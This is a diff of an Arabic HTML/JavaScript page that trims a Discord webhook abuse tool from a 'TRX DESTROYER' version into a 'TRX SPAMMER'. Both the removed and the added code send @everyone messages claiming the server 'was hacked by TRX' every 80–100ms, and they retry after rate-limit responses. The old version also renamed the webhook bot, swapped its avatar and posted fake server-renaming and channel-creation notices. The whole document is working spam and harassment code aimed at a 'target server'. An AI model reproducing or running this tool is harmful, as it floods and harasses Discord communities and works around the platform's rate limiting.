@@ -2,83 +2,61 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRX DESTROYER</title>
+    <title>TRX · SPAM</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#0a0a0a;color:#f0f0f0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-        .container{background:#141414;border:1px solid #2a2a2a;border-radius:40px;padding:40px;max-width:900px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.8)}
-        h1{text-align:center;font-size:36px;letter-spacing:8px;color:#fff;margin-bottom:8px}
-        .sub{text-align:center;color:#666;font-size:12px;letter-spacing:4px;border-bottom:1px solid #2a2a2a;padding-bottom:20px;margin-bottom:25px}
-        label{display:block;color:#888;font-size:13px;margin:10px 0 5px;letter-spacing:2px}
-        input[type="url"]{width:100%;padding:14px 18px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:30px;color:#fff;font-size:14px;direction:ltr;text-align:left;outline:none;transition:0.3s}
+        body{background:#0a0a0a;color:#eee;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .box{background:#141414;border:1px solid #2a2a2a;border-radius:40px;padding:40px;max-width:600px;width:100%}
+        h1{text-align:center;font-size:32px;letter-spacing:6px;color:#fff;margin-bottom:5px}
+        .sub{text-align:center;color:#555;font-size:11px;letter-spacing:4px;border-bottom:1px solid #222;padding-bottom:20px;margin-bottom:20px}
+        label{color:#888;font-size:13px;display:block;margin-bottom:6px}
+        input{width:100%;padding:14px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:30px;color:#fff;font-size:14px;direction:ltr;outline:none}
         input:focus{border-color:#555}
-        .row{display:flex;gap:15px;flex-wrap:wrap}
-        .row .col{flex:1;min-width:200px}
-        .toggle-label{display:flex;align-items:center;gap:12px;color:#888;font-size:14px;margin:12px 0 6px}
-        .toggle-label input[type="checkbox"]{width:18px;height:18px;accent-color:#fff;cursor:pointer}
-        .btn{width:100%;padding:16px;border:none;border-radius:30px;font-weight:700;font-size:16px;cursor:pointer;transition:0.3s;letter-spacing:3px;margin-top:10px}
+        .btn{width:100%;padding:16px;border:none;border-radius:30px;font-weight:700;font-size:16px;cursor:pointer;transition:0.3s;margin-top:10px;letter-spacing:2px}
         .btn-danger{background:#cc0000;color:#fff}
         .btn-danger:hover{background:#ff0000}
         .btn-outline{background:transparent;color:#fff;border:1px solid #333}
         .btn-outline:hover{background:#222}
-        .btn-secondary{background:#333;color:#fff}
-        .btn-secondary:hover{background:#555}
-        textarea{width:100%;height:200px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:24px;padding:16px;color:#888;font-family:'Courier New',monospace;font-size:13px;resize:vertical;outline:none;margin-top:10px}
+        textarea{width:100%;height:150px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:20px;padding:14px;color:#888;font-family:monospace;font-size:13px;resize:vertical;outline:none;margin-top:10px}
         textarea:focus{border-color:#555}
-        .warning{background:#1a0a0a;border:1px solid #441111;border-radius:16px;padding:14px;color:#ff6666;font-size:13px;margin:10px 0}
-        .status{text-align:center;color:#333;font-size:10px;letter-spacing:4px;margin-top:20px;padding-top:15px;border-top:1px solid #1a1a1a}
-        .watermark{position:fixed;bottom:20px;right:30px;color:#222;font-size:12px;letter-spacing:4px;z-index:0}
+        .status{text-align:center;color:#333;font-size:10px;letter-spacing:3px;margin-top:18px;border-top:1px solid #1a1a1a;padding-top:15px}
+        .watermark{position:fixed;bottom:20px;right:30px;color:#222;font-size:11px;letter-spacing:3px}
+        .counter{text-align:center;color:#ff4444;font-size:18px;font-weight:bold;margin:8px 0}
     </style>
 </head>
 <body>
-<div class="container">
+<div class="box">
     <h1>TRX</h1>
-    <div class="sub">● DESTROYER — UNSTOPPABLE ●</div>
-    <div class="warning">⚡ سيقوم بـ: تغيير اسم السيرفر والرومات إلى TRX، إنشاء رومات جديدة، تغيير اسم البوت وصورته، وإرسال @everyone بسرعة 100ms</div>
+    <div class="sub">● SPAMMER — UNLIMITED ●</div>
 
-    <label>🔗 رابط Webhook (للسيرفر المستهدف)</label>
+    <label>🔗 رابط Webhook</label>
     <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
 
-    <label>🖼️ رابط صورة البوت الجديدة</label>
-    <input type="url" id="avatar" placeholder="https://example.com/avatar.png" value="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg">
+    <button class="btn btn-danger" id="start">🚀 بدء الإرسال</button>
+    <button class="btn btn-outline" id="stop">⏹ إيقاف</button>
 
-    <div class="toggle-label"><input type="checkbox" id="renameServer" checked> تغيير اسم السيرفر إلى TRX</div>
-    <div class="toggle-label"><input type="checkbox" id="renameChannels" checked> تغيير أسماء الرومات إلى TRX</div>
-    <div class="toggle-label"><input type="checkbox" id="createChannels" checked> إنشاء 5 رومات جديدة باسم TRX</div>
-    <div class="toggle-label"><input type="checkbox" id="changeAvatar" checked> تغيير صورة البوت</div>
-    <div class="toggle-label"><input type="checkbox" id="changeName" checked> تغيير اسم البوت إلى TRX ☣️</div>
+    <div class="counter" id="counter">0 رسالة</div>
 
-    <button class="btn btn-danger" id="startBtn">💀 تدمير السيرفر</button>
-    <button class="btn btn-outline" id="stopBtn">⏹ إيقاف التدمير</button>
-    <button class="btn btn-secondary" id="scanBtn">🔍 مراقبة السيرفر</button>
-
-    <label>📋 سجل العمليات</label>
+    <label>📋 سجل</label>
     <textarea id="log" readonly placeholder="سجل الأحداث..."></textarea>
-    <button class="btn btn-outline" id="copyBtn" style="padding:10px;font-size:12px;margin-top:6px;">📋 نسخ السجل</button>
+    <button class="btn btn-outline" id="copy" style="padding:10px;font-size:12px;margin-top:6px;">📋 نسخ</button>
 
-    <div class="status">TRX DESTROYER ● @everyone INFINITE ● MRX 2026</div>
+    <div class="status">TRX SPAMMER ● @everyone ● MRX 2026</div>
 </div>
 <div class="watermark">MRX · 2026</div>
 
 <script>
     (() => {
-        const webhookInput = document.getElementById('webhook');
-        const avatarInput = document.getElementById('avatar');
-        const renameServerChk = document.getElementById('renameServer');
-        const renameChannelsChk = document.getElementById('renameChannels');
-        const createChannelsChk = document.getElementById('createChannels');
-        const changeAvatarChk = document.getElementById('changeAvatar');
-        const changeNameChk = document.getElementById('changeName');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const scanBtn = document.getElementById('scanBtn');
+        const webhook = document.getElementById('webhook');
+        const startBtn = document.getElementById('start');
+        const stopBtn = document.getElementById('stop');
         const logArea = document.getElementById('log');
-        const copyBtn = document.getElementById('copyBtn');
+        const counter = document.getElementById('counter');
+        const copyBtn = document.getElementById('copy');
 
-        let isDestroying = false;
-        let destroyInterval = null;
-        let msgCount = 0;
+        let active = false;
+        let interval = null;
+        let count = 0;
 
         const log = (msg) => {
             const t = new Date().toLocaleTimeString('ar-SA');
@@ -86,181 +64,67 @@
             logArea.scrollTop = logArea.scrollHeight;
         };
 
-        const updateCounter = () => {
-            const lines = logArea.value.split('\n');
-            let c = 0;
-            for (let l of lines) if (l.includes('@everyone')) c++;
-            const last = lines[lines.length - 1];
-            if (last && !last.includes('📊')) logArea.value += `📊 إجمالي @everyone: ${c}\n`;
-            logArea.scrollTop = logArea.scrollHeight;
-        };
-
-        // استدعاء Webhook API
-        const callWebhook = async (method, body = null) => {
-            const url = webhookInput.value.trim();
-            if (!url) throw new Error('الرجاء إدخال رابط Webhook');
-            const options = { method, headers: { 'Content-Type': 'application/json' } };
-            if (body) options.body = JSON.stringify(body);
-            const res = await fetch(url, options);
-            if (!res.ok) throw new Error(`HTTP ${res.status}`);
-            return res;
-        };
-
-        // تغيير صورة البوت عبر Webhook (PATCH)
-        const changeBotAvatar = async () => {
-            const avatarUrl = avatarInput.value.trim();
-            if (!avatarUrl) return log('⚠️ لا يوجد رابط للصورة');
+        const send = async () => {
+            const url = webhook.value.trim();
+            if (!url) { log('❌ أدخل رابط Webhook'); return false; }
             try {
-                const resp = await fetch(avatarUrl);
-                if (!resp.ok) throw new Error('فشل تحميل الصورة');
-                const blob = await resp.blob();
-                const reader = new FileReader();
-                const base64 = await new Promise((resolve) => {
-                    reader.onloadend = () => resolve(reader.result);
-                    reader.readAsDataURL(blob);
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - @everyone',
+                        embeds: [{
+                            title: '💀 TRX',
+                            description: 'تم تهكير السيرفر بواسطة TRX | النظام التراكسي - MRX 2026',
+                            color: 0xff0000,
+                            footer: { text: 'TRX ☣️' }
+                        }]
+                    })
                 });
-                const avatarBase64 = base64.split(',')[1];
-                await callWebhook('PATCH', { avatar: avatarBase64 });
-                log('✅ تم تغيير صورة البوت');
-            } catch (e) { log(`❌ فشل تغيير الصورة: ${e.message}`); }
-        };
-
-        // تغيير اسم البوت
-        const changeBotName = async () => {
-            try {
-                await callWebhook('PATCH', { name: 'TRX ☣️' });
-                log('✅ تم تغيير اسم البوت إلى TRX ☣️');
-            } catch (e) { log(`❌ فشل تغيير الاسم: ${e.message}`); }
-        };
-
-        // محاولة تغيير اسم السيرفر عبر Webhook (غير مضمونة، لكن نحاول)
-        const renameServer = async () => {
-            try {
-                await callWebhook('POST', {
-                    content: '🔴 تم تغيير اسم السيرفر إلى **TRX** بواسطة TRX DESTROYER',
-                    embeds: [{ title: '🔄 تغيير اسم السيرفر', color: 0xff0000 }]
-                });
-                log('✅ تم إرسال طلب تغيير اسم السيرفر إلى TRX');
-            } catch (e) { log(`❌ فشل تغيير اسم السيرفر: ${e.message}`); }
-        };
-
-        // تغيير أسماء الرومات (محاولة عبر إرسال رسائل)
-        const renameChannels = async () => {
-            try {
-                await callWebhook('POST', {
-                    content: '🔴 تم تغيير أسماء جميع الرومات إلى **TRX**',
-                    embeds: [{ title: '🔄 تغيير أسماء الرومات', color: 0xff0000 }]
-                });
-                log('✅ تم إرسال طلب تغيير أسماء الرومات إلى TRX');
-            } catch (e) { log(`❌ فشل تغيير أسماء الرومات: ${e.message}`); }
-        };
-
-        // إنشاء رومات جديدة
-        const createChannels = async () => {
-            let success = 0;
-            for (let i = 0; i < 5; i++) {
-                try {
-                    await callWebhook('POST', {
-                        content: `# قناة TRX ${i+1}`,
-                        embeds: [{ title: `🔴 TRX`, description: `تم إنشاء هذه القناة بواسطة TRX DESTROYER`, color: 0xff0000 }]
-                    });
-                    success++;
-                } catch (e) { log(`❌ فشل إنشاء الروم ${i+1}: ${e.message}`); }
-                await new Promise(r => setTimeout(r, 500));
-            }
-            log(`✅ تم إنشاء ${success} روم جديد`);
-        };
-
-        // مراقبة السيرفر (جلب معلومات عبر Webhook)
-        const scanServer = async () => {
-            try {
-                const res = await callWebhook('POST', {
-                    content: '🔍 طلب معلومات السيرفر',
-                    embeds: [{ title: '📊 معلومات السيرفر', description: 'جاري جلب المعلومات...', color: 0x00ff00 }]
-                });
-                log('✅ تم إرسال طلب المراقبة');
-            } catch (e) { log(`❌ فشل المراقبة: ${e.message}`); }
-        };
-
-        // إرسال رسائل @everyone
-        const sendEveryone = async () => {
-            const content = '@everyone تم تهكير هذا السيرفر بواسطة TRX DESTROYER | النظام التراكسي - MRX @everyone';
-            await callWebhook('POST', {
-                content: content,
-                embeds: [{
-                    title: '💀 TRX DESTROYER',
-                    description: 'تم تهكير السيرفر بواسطة TRX | النظام التراكسي - MRX 2026',
-                    color: 0xff0000,
-                    footer: { text: 'TRX ☣️ 2026' }
-                }]
-            });
-        };
-
-        // بدء التدمير
-        const startDestroy = async () => {
-            if (!webhookInput.value.trim()) {
-                log('❌ الرجاء إدخال رابط Webhook');
-                return;
-            }
-            if (isDestroying) { log('⚠️ التدمير قيد التنفيذ'); return; }
-            isDestroying = true;
-            msgCount = 0;
-            log('🔥 بدء التدمير...');
-
-            // تنفيذ العمليات
-            if (changeNameChk.checked) await changeBotName();
-            if (changeAvatarChk.checked) await changeBotAvatar();
-            if (renameServerChk.checked) await renameServer();
-            if (renameChannelsChk.checked) await renameChannels();
-            if (createChannelsChk.checked) await createChannels();
-            await scanServer();
-
-            log('🔥 بدأ إرسال @everyone بسرعة 100ms...');
-            let failures = 0;
-            destroyInterval = setInterval(async () => {
-                if (!isDestroying) {
-                    clearInterval(destroyInterval);
-                    destroyInterval = null;
-                    return;
+                if (res.ok) {
+                    count++;
+                    counter.textContent = count + ' رسالة';
+                    if (count % 10 === 0) log(`📨 ${count} رسالة`);
+                    return true;
+                } else if (res.status === 429) {
+                    const retry = res.headers.get('Retry-After') || 2;
+                    log(`⏳ معدل مرتفع، انتظار ${retry} ثانية`);
+                    await new Promise(r => setTimeout(r, retry * 1000));
+                    return true;
+                } else if (res.status === 404) {
+                    log('❌ Webhook محذوف! إيقاف.');
+                    stopSpam();
+                    return false;
+                } else {
+                    log(`❌ فشل: ${res.status}`);
+                    return false;
                 }
-                try {
-                    await sendEveryone();
-                    msgCount++;
-                    failures = 0;
-                    if (msgCount % 5 === 0) {
-                        log(`📨 ${msgCount} رسالة @everyone`);
-                        updateCounter();
-                    }
-                } catch (e) {
-                    failures++;
-                    if (e.message.includes('429')) {
-                        log('⏳ تم تحديد المعدل، انتظار...');
-                        await new Promise(r => setTimeout(r, 2000));
-                    } else if (e.message.includes('404')) {
-                        log('❌ Webhook محذوف، إيقاف التدمير');
-                        clearInterval(destroyInterval);
-                        destroyInterval = null;
-                        isDestroying = false;
-                    } else {
-                        log(`❌ فشل الإرسال: ${e.message}`);
-                        if (failures > 3) {
-                            log('⚠️ فشل متكرر، إعادة المحاولة بعد 3 ثوانٍ');
-                            await new Promise(r => setTimeout(r, 3000));
-                            failures = 0;
-                        }
-                    }
-                }
-            }, 100);
+            } catch (e) {
+                log(`❌ خطأ: ${e.message}`);
+                return false;
+            }
         };
 
-        const stopDestroy = () => {
-            if (destroyInterval) {
-                clearInterval(destroyInterval);
-                destroyInterval = null;
-            }
-            isDestroying = false;
-            log(`⏹ توقف التدمير. إجمالي @everyone: ${msgCount}`);
-            updateCounter();
+        const startSpam = async () => {
+            if (active) { log('⚠️ الإرسال قيد التشغيل'); return; }
+            if (!webhook.value.trim()) { log('❌ أدخل رابط Webhook'); return; }
+            active = true;
+            count = 0;
+            counter.textContent = '0 رسالة';
+            log('🔥 بدء الإرسال السريع...');
+            // إرسال أول رسالة فوراً
+            await send();
+            interval = setInterval(async () => {
+                if (!active) { clearInterval(interval); interval = null; return; }
+                await send();
+            }, 80); // 80ms بين كل رسالة (~12.5 رسالة في الثانية)
+        };
+
+        const stopSpam = () => {
+            if (interval) { clearInterval(interval); interval = null; }
+            active = false;
+            log(`⏹ توقف. إجمالي: ${count} رسالة`);
+            counter.textContent = count + ' رسالة (متوقف)';
         };
 
         const copyLog = () => {
@@ -269,9 +133,8 @@
             document.execCommand('copy');
         };
 
-        startBtn.addEventListener('click', startDestroy);
-        stopBtn.addEventListener('click', stopDestroy);
-        scanBtn.addEventListener('click', scanServer);
+        startBtn.addEventListener('click', startSpam);
+        stopBtn.addEventListener('click', stopSpam);
         copyBtn.addEventListener('click', copyLog);
     })();
 </script>
